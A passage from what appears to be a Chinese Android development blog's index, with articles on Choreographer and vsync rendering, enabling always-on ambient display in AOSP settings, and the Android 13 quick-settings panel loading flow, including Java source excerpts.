buffer和屏幕这一端来说）来触发，显然FPS（帧率）是不够的，由此造成流畅度肯定不够好。</p><p>于是在Android 4.1 （Jelly Bean）中就引入了Choreographer以及vsync机制，来解决此问题，它们两个并不全完是一回事，Choreographer是纯软件的，vsync则是更为复杂的更底层的机制，有没有vsync，Choreographer都能很好的工作，只不过有了vsync会更好，就好比硬件加速之于View的渲染，没有硬件加速也可以渲染啊，有了硬件加速渲染会更加的快一些。</p><h3 id="Choreographer"><a href="#Choreographer" class="headerlink" title="Choreographer"></a>Choreographer</h3><p>它的英文本意是歌舞的编舞者，有点类似于导演，但歌舞一般时间更短，所以对编舞者要求更高，需要在短时间内把精华全部展现出来。它的目的就是要协调整个View的渲染过程，对输入事件响应，动画和渲染进行时间上的把控。文档原文是说：Coordinates the timing of animations, input and drawing.，精华就在于timing这个词上。</p><p>但其实，这个类本身并不是很复杂，相较于其他frameworks层的东西来说它算简单的了，它就是负责定时回调，按照一定的FPS来给你回调，简单来说它就是做了这么一件事情。它公开的接口也特别少，就是postFrameCallback和removeFrameCallback，而FrameCallback也是一个非常简单的接口doFrame(long frameTimeNanos)，里面的参数是当前帧开始渲染的时间序列。</p><p>所以，它的工作就是在计时，或者叫把控时间，到了每一帧该渲染的时候了，它会告诉你。有了它，那么GUI的渲染将不再是按需重绘了，而是有节奏的，可以以固定FPS定时刷新。ViewRootImpl那头也需要做调整，每当有主动重绘时（view tree有变化，用户有输入事件等），也并不是说立马就去做draw，而是往Choreographer里post一个FrameCallback，在里面做具体的draw。</p><h3 id="vsync（Vertical-Synchronization）"><a href="#vsync（Vertical-Synchronization）" class="headerlink" title="vsync（Vertical Synchronization）"></a>vsync（Vertical Synchronization）</h3><p>垂直同步，是另外一套更为底层的机制，简单来理解就是由屏幕显示系统直接向软件层派发定时的脉冲信号，用以提高整体的渲染流畅程度，屏幕刷新，graphic buffer和window GUI（view tree）三者在这个脉冲信号下，做到同步。</p><p>vsync是通过对Choreographer来发挥作用的。Choreographer有两套timing机制，一是靠它自己实现的一套，另外就是直接传导vsync的信号。通过DisplayEventReceiver（这个类对于App层是完全不可见的被hide了）就可以接收到vsync的信号了，调用其sheduleVsync来告诉vsync说我想接收下一次同步的信号，然后在重载onVsync方法以接收信号，就能够与vsync系统连接起来了。</p><h2 id="渲染性能优化"><a href="#渲染性能优化" class="headerlink" title="渲染性能优化"></a>渲染性能优化</h2><p>这是一个很大的话题</p><h3 id="保持简单"><a href="#保持简单" class="headerlink" title="保持简单"></a>保持简单</h3><p>最最重要的原则就是要保持简单，比如，UI页面尽可能的简洁，view tree的层级要尽可能的少，能用颜色就别用背景图片，能merge就merge。</p><p>动画也要尽可能的简单，并且使用标准的ValueAnimator接口，而不要简单粗暴的去修改LayoutParams（如height和width）。</p><h3 id="减少重绘"><a href="#减少重绘" class="headerlink" title="减少重绘"></a>减少重绘</h3><p>这个要多用系统中开发者模式里面的重绘调试工具来做优化，尽可能的减少重绘。</p><h3 id="专项定制"><a href="#专项定制" class="headerlink" title="专项定制"></a>专项定制</h3><p>有些时候，对于一些特殊需求的view要进行定制优化。举个例子，比如一个巨复杂的页面（如某宝的首页），中有一个用于显示倒计时的view，实现起来并不复杂，一个TextView就搞定了，一个Timer来倒计时，不断的刷新数字 就可以了。但是，这通常会导致整个页面都跟着在重绘。因为数字在变化，会导致TextView的大小在变化，进而导致整个View tree都在不断的跟着重绘。</p><p>像这种case，如果遇到了，就需要自定义一个专门用于此的View，并针对数字不断刷新做专门的优化，以不让其影响整个view tree。</p><p>不要在意这个例子的真实性，要知道，当某个View演变成了整个页面的瓶颈的时候，就需要专门针对 其进行特殊定制以优化整体页面的渲染性能。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何让Android设备实现息屏显示</title>
      <link href="/2023/06/25/2023-06-25/"/>
      <url>/2023/06/25/2023-06-25/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="什么是息屏显示？"><a href="#什么是息屏显示？" class="headerlink" title="什么是息屏显示？"></a>什么是息屏显示？</h3><p>息屏显示就是手机在息屏状态下，屏幕上会显示当前时间、日期信息，无需点亮手机屏幕即可查看。息屏显示的原理主要是利用了OLED屏幕像素点自发光的特性，仅显示时间的像素点发光，功耗相比LCD屏幕要低很多。<br><img src="/images/20230525/20230624_120147.jpg"></p><h3 id="Android原生的主动显示"><a href="#Android原生的主动显示" class="headerlink" title="Android原生的主动显示"></a>Android原生的主动显示</h3><p>玩过Android源码的同学应该知道，在Settings里有一个开关项：<br>设置 - 显示 - 主动显示<br><img src="/images/20230525/20230624_130200.jpg"></p><p>这就是设置 - 显示下的主动显示选项，勾选了这个选项后，当设备在息屏时接到一条新通知会显示这样的效果：<br><img src="/images/20230525/20230624_140300.jpg"></p><p>是不是发现与息屏显示的效果一模一样，但触发条件却不一样，需要息屏后有通知才会显示出来，并且过一段时间又会自动消失回归黑屏，那么怎样才能做到像三星那样的息屏后就能一直都显示呢？</p><p>源码分析</p><p>既然知道主动显示开关是放在设置里面的，那不妨先从Settings的源码看起，首先找到主动显示对应的Preference</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Preference</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:key</span>=<span class="string">&quot;ambient_display&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:title</span>=<span class="string">&quot;@string/ambient_display_screen_title&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fragment</span>=<span class="string">&quot;com.android.settings.display.AmbientDisplaySettings&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>然后发现在AmbientDisplaySettings里注册了一些controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;AbstractPreferenceController&gt; <span class="title function_">buildPreferenceControllers</span><span class="params">(Context context,</span></span><br><span class="line"><span class="params">        Lifecycle lifecycle, AmbientDisplayConfiguration config,</span></span><br><span class="line"><span class="params">        MetricsFeatureProvider metricsFeatureProvider,</span></span><br><span class="line"><span class="params">        AmbientDisplayAlwaysOnPreferenceController.OnPreferenceChangedCallback aodCallback)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> List&lt;AbstractPreferenceController&gt; controllers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    controllers.add(<span class="keyword">new</span> <span class="title class_">AmbientDisplayNotificationsPreferenceController</span>(context, config,</span><br><span class="line">            metricsFeatureProvider));</span><br><span class="line">    controllers.add(<span class="keyword">new</span> <span class="title class_">AmbientDisplayAlwaysOnPreferenceController</span>(context, config,</span><br><span class="line">            aodCallback));</span><br><span class="line">    controllers.add(<span class="keyword">new</span> <span class="title class_">DoubleTapScreenPreferenceController</span>(context, lifecycle, config,</span><br><span class="line">            MY_USER_ID, KEY_AMBIENT_DISPLAY_DOUBLE_TAP));</span><br><span class="line">    controllers.add(<span class="keyword">new</span> <span class="title class_">PickupGesturePreferenceController</span>(context, lifecycle, config,</span><br><span class="line">            MY_USER_ID, KEY_AMBIENT_DISPLAY_PICK_UP));</span><br><span class="line">    <span class="keyword">return</span> controllers;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先关注里面的两个：AmbientDisplayNotificationsPreferenceController和AmbientDisplayAlwaysOnPreferenceController，看名字大概能知道，第一个与通知有关，应该是上文提到的息屏后来通知才显示；而第二个就是我们要找的“始终开启”。</p><p>AmbientDisplayAlwaysOnPreferenceController</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AmbientDisplayAlwaysOnPreferenceController</span> <span class="keyword">extends</span></span><br><span class="line">        <span class="title class_">AbstractPreferenceController</span> <span class="keyword">implements</span> <span class="title class_">PreferenceControllerMixin</span>,</span><br><span class="line">        Preference.OnPreferenceChangeListener &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">ON</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">OFF</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// 每次进入该PreferenceScreen都会调用一次刷新开关状态</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateState</span><span class="params">(Preference preference)</span> &#123;</span><br><span class="line">        ((SwitchPreference) preference).setChecked(isAlwaysOnEnabled(mConfig));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过AmbientDisplayConfiguration获得当前enable状态</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isAlwaysOnEnabled</span><span class="params">(AmbientDisplayConfiguration config)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> config.alwaysOnEnabled(MY_USER);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 每次点击后写入数据</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onPreferenceChange</span><span class="params">(Preference preference, Object newValue)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">enabled</span> <span class="operator">=</span> (<span class="type">boolean</span>) newValue ? ON : OFF;</span><br><span class="line">        Settings.Secure.putInt(</span><br><span class="line">                mContext.getContentResolver(), Settings.Secure.DOZE_ALWAYS_ON, enabled);</span><br><span class="line">        <span class="keyword">if</span> (mCallback != <span class="literal">null</span>) &#123;</span><br><span class="line">            mCallback.onPreferenceChanged();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 该Preference是否可用</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAvailable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isAvailable(mConfig);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过AmbientDisplayConfiguration 获得available状态</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isAvailable</span><span class="params">(AmbientDisplayConfiguration config)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> config.alwaysOnAvailableForUser(MY_USER);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析AmbientDisplayAlwaysOnPreferenceController的源码发现，AlwaysOn的enable和available状态都需要通过AmbientDisplayConfiguration 这个类来获得，并且这个类位于framework中。</p><p>简单介绍下AmbientDisplayConfiguration 中与alwaysOn有关的几个函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">alwaysOnEnabled</span><span class="params">(<span class="type">int</span> user)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> boolSettingDefaultOn(Settings.Secure.DOZE_ALWAYS_ON, user) &amp;&amp; alwaysOnAvailable()</span><br><span class="line">            &amp;&amp; !accessibilityInversionEnabled(user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">alwaysOnAvailable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (alwaysOnDisplayDebuggingEnabled() || alwaysOnDisplayAvailable())</span><br><span class="line">            &amp;&amp; ambientDisplayAvailable();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">alwaysOnDisplayAvailable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mContext.getResources().getBoolean(R.bool.config_dozeAlwaysOnDisplayAvailable);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">accessibilityInversionEnabled</span><span class="params">(<span class="type">int</span> user)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> boolSettingDefaultOff(Settings.Secure.ACCESSIBILITY_DISPLAY_INVERSION_ENABLED, user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">ambientDisplayAvailable</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> !TextUtils.isEmpty(ambientDisplayComponent());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">ambientDisplayComponent</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> mContext.getResources().getString(R.string.config_dozeComponent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">boolSettingDefaultOn</span><span class="params">(String name, <span class="type">int</span> user)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> boolSetting(name, user, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">boolSetting</span><span class="params">(String name, <span class="type">int</span> user, <span class="type">int</span> def)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> Settings.Secure.getIntForUser(mContext.getContentResolver(), name, def, user) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>alwaysOnAvailable为true需要同时满足两个条件：</p><pre><code>处于debug模式，或者config_dozeAlwaysOnDisplayAvailable为true，这个值写在frameworks/base/core/res/res/values/config.xml里，默认是false；config_dozeComponent取值不为空，这个值同样写在上面讲到的config.xml里，默认是空着的。</code></pre><p>alwaysOnEnabled为true需要同时满足三个条件：</p><pre><code>DOZE_ALWAYS_ON值写入了1，即Settings里开启了开关；alwaysOnAvailable为true；ACCESSIBILITY_DISPLAY_INVERSION_ENABLED值为0，即没有开启颜色反转。</code></pre><p>原来源码里面默认把AlwaysOn功能给关闭了，如果想启用这个功能，需要修改config.xml里的两个值或者强制alwaysOnAvailable返回true，修改后设置里的主动显示一栏就会多出一项“始终开启”可以勾选，这样一来我们的设备在息屏之后就能自动开启主动显示功能了。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Framework </tag>
            
            <tag> Settings </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android13下拉状态栏QS面板的加载流程解析</title>
      <link href="/2023/05/22/2023-05-22/"/>
      <url>/2023/05/22/2023-05-22/</url>
      
        <content type="html"><![CDATA[<h2 id="1、QS创建"><a href="#1、QS创建" class="headerlink" title="1、QS创建"></a>1、QS创建</h2><p>QSPanel 创建是从 CentralSurfacesImpl#makeStatusBarView 开始的，Qs面板创建这块，与之前版本对比，没啥变化。<br><strong>com.android.systemui.statusbar.phone.CentralSurfacesImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">makeStatusBarView</span><span class="params">()</span> &#123;</span><br><span class="line">      ......</span><br><span class="line">      <span class="comment">// 设置快速设置面板</span></span><br><span class="line">      <span class="comment">// R.id.qs_frame 是一个 FrameLayout 布局，将 QSFragment 布局添加到其中。所以 R.id.qs_frame 最终显示的是 QSFragment 。</span></span><br><span class="line">      <span class="keyword">final</span> <span class="type">View</span> <span class="variable">container</span> <span class="operator">=</span> mNotificationShadeWindowView.findViewById(R.id.qs_frame);</span><br><span class="line">      <span class="keyword">if</span> (container != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="type">FragmentHostManager</span> <span class="variable">fragmentHostManager</span> <span class="operator">=</span> FragmentHostManager.get(container);</span><br><span class="line">          ExtensionFragmentListener.attachExtensonToFragment(container, QS.TAG, R.id.qs_frame,</span><br><span class="line">                  mExtensionController</span><br><span class="line">                          .newExtension(QS.class)</span><br><span class="line">                          .withPlugin(QS.class)</span><br><span class="line">                          .withDefault(<span class="built_in">this</span>::createDefaultQSFragment)</span><br><span class="line">                          .build());</span><br><span class="line">          <span class="comment">// 亮度控制器</span></span><br><span class="line">          mBrightnessMirrorController = <span class="keyword">new</span> <span class="title class_">BrightnessMirrorController</span>(</span><br><span class="line">                  mNotificationShadeWindowView,</span><br><span class="line">                  mNotificationPanelViewController,</span><br><span class="line">                  mNotificationShadeDepthControllerLazy.get(),</span><br><span class="line">                  mBrightnessSliderFactory,</span><br><span class="line">                  (visible) -&gt; &#123;</span><br><span class="line">                      mBrightnessMirrorVisible = visible;</span><br><span class="line">                      updateScrimController();</span><br><span class="line">                  &#125;);</span><br><span class="line">          fragmentHostManager.addTagListener(QS.TAG, (tag, f) -&gt; &#123;</span><br><span class="line">              <span class="type">QS</span> <span class="variable">qs</span> <span class="operator">=</span> (QS) f;</span><br><span class="line">              <span class="keyword">if</span> (qs <span class="keyword">instanceof</span> QSFragment) &#123;</span><br><span class="line">                  mQSPanelController = ((QSFragment) qs).getQSPanelController();</span><br><span class="line">                  ((QSFragment) qs).setBrightnessMirrorController(mBrightnessMirrorController);</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;);</span><br><span class="line">      &#125;</span><br><span class="line">      ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就先看看 QSFragment 的 onCreateView() 方法：<br><strong>com.android.systemui.qs.QSFragment.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container,</span></span><br><span class="line"><span class="params">        Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Trace.beginSection(<span class="string">&quot;QSFragment#onCreateView&quot;</span>);</span><br><span class="line">        inflater = inflater.cloneInContext(<span class="keyword">new</span> <span class="title class_">ContextThemeWrapper</span>(getContext(),</span><br><span class="line">                R.style.Theme_SystemUI_QuickSettings));</span><br><span class="line">        <span class="comment">// 在这里返回了布局，R.layout.qs_panel</span></span><br><span class="line">        <span class="keyword">return</span> inflater.inflate(R.layout.qs_panel, container, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        Trace.endSection();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>再看 QSFragment 的构造函数：<br><strong>com.android.systemui.qs.QSFragment.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="meta">@Inject</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">QSFragment</span><span class="params">(RemoteInputQuickSettingsDisabler remoteInputQsDisabler,</span></span><br><span class="line"><span class="params">        QSTileHost qsTileHost,</span></span><br><span class="line"><span class="params">        StatusBarStateController statusBarStateController, CommandQueue commandQueue,</span></span><br><span class="line"><span class="params">        <span class="meta">@Named(QS_PANEL)</span> MediaHost qsMediaHost,</span></span><br><span class="line"><span class="params">        <span class="meta">@Named(QUICK_QS_PANEL)</span> MediaHost qqsMediaHost,</span></span><br><span class="line"><span class="params">        KeyguardBypassController keyguardBypassController,</span></span><br><span class="line"><span class="params">        QSFragmentComponent.Factory qsComponentFactory,</span></span><br><span class="line"><span class="params">        QSFragmentDisableFlagsLogger qsFragmentDisableFlagsLogger,</span></span><br><span class="line"><span class="params">        FalsingManager falsingManager, DumpManager dumpManager)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    mHost = qsTileHost;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这里注意 @Inject 注解，这个是 Android dagger里的一种注解。<br>在这里，与Android 9.0及其以下版本实例化 QSTileHost类的方式不一样，这里是通dagger来实例化的。所以这里实例化了QSTileHost 。<br>下面我们就进入到 QSTileHost 的构造方法：<br><strong>com.android.systemui.qs.QSTileHost.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="meta">@Inject</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">QSTileHost</span><span class="params">(Context context,</span></span><br><span class="line"><span class="params">        StatusBarIconController iconController,</span></span><br><span class="line"><span class="params">        QSFactory defaultFactory,</span></span><br><span class="line"><span class="params">        <span class="meta">@Main</span> Handler mainHandler,</span></span><br><span class="line"><span class="params">        <span class="meta">@Background</span> Looper bgLooper,</span></span><br><span class="line"><span class="params">        PluginManager pluginManager,</span></span><br><span class="line"><span class="params">        TunerService tunerService,</span></span><br><span class="line"><span class="params">        Provider&lt;AutoTileManager&gt; autoTiles,</span></span><br><span class="line"><span class="params">        DumpManager dumpManager,</span></span><br><span class="line"><span class="params">        BroadcastDispatcher broadcastDispatcher,</span></span><br><span class="line"><span class="params">        Optional&lt;CentralSurfaces&gt; centralSurfacesOptional,</span></span><br><span class="line"><span class="params">        QSLogger qsLogger,</span></span><br><span class="line"><span class="params">        UiEventLogger uiEventLogger,</span></span><br><span class="line"><span class="params">        UserTracker userTracker,</span></span><br><span class="line"><span class="params">        SecureSettings secureSettings,</span></span><br><span class="line"><span class="params">        CustomTileStatePersister customTileStatePersister,</span></span><br><span class="line"><span class="params">        TileServiceRequestController.Builder tileServiceRequestControllerBuilder,</span></span><br><span class="line"><span class="params">        TileLifecycleManager.Factory tileLifecycleManagerFactory</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    mainHandler.post(() -&gt; &#123;</span><br><span class="line">        <span class="comment">// This is technically a hack to avoid circular dependency of</span></span><br><span class="line">        <span class="comment">// QSTileHost -&gt; XXXTile -&gt; QSTileHost. Posting ensures creation</span></span><br><span class="line">        <span class="comment">// 在创建任何图块之前完成。</span></span><br><span class="line">        tunerService.addTunable(<span class="built_in">this</span>, TILES_SETTING);</span><br><span class="line">        <span class="comment">// AutoTileManager 可以修改 mTiles，因此请确保 mTiles 已经初始化。</span></span><br><span class="line">        mAutoTiles = autoTiles.get();</span><br><span class="line">        mTileServiceRequestController.init();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>在 QSTileHost 的构造函数里，我们主要看 tunerService.addTunable(this, TILES_SETTING); 很明显，调用 tunerService 里的 addTunabe() 方法，跟进去会发现，最终的是调用的 TunerServiceImpl 里面的 addTunabe() 方法。<br><strong>com.android.systemui.tuner.TunerServiceImpl.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addTunable</span><span class="params">(Tunable tunable, String... keys)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (String key : keys) &#123;</span><br><span class="line">        addTunable(tunable, key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">addTunable</span><span class="params">(Tunable tunable, String key)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 从数据库读取数据；刷机第一次数据库为空，这里也会空，后面程序会从配置文件读取；</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> DejankUtils.whitelistIpcs(() -&gt; Settings.Secure</span><br><span class="line">            .getStringForUser(mContentResolver, key, mCurrentUser));</span><br><span class="line">    tunable.onTuningChanged(key, value);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>tunable.onTuningChanged() 回调 QSTileHost#onTuningChanged():<br><strong>com.android.systemui.qs.QSTileHost.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 